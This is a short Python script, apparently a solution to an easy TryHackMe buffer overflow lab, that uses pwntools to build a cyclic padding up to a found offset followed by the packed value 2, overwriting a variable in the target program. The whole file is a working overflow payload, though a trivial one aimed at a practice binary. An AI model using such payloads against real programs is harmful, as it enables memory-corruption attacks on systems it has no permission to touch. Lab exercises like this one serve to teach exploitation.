#!bin/python
"""
 Easy Tryhackme buffer overflow exercice
 resolved using pwntool

"""
from pwn import *

padding = cyclic(cyclic_find('daaa'))
variable_new_value = p32(2)

payload = padding + variable_new_value 

print(payload)
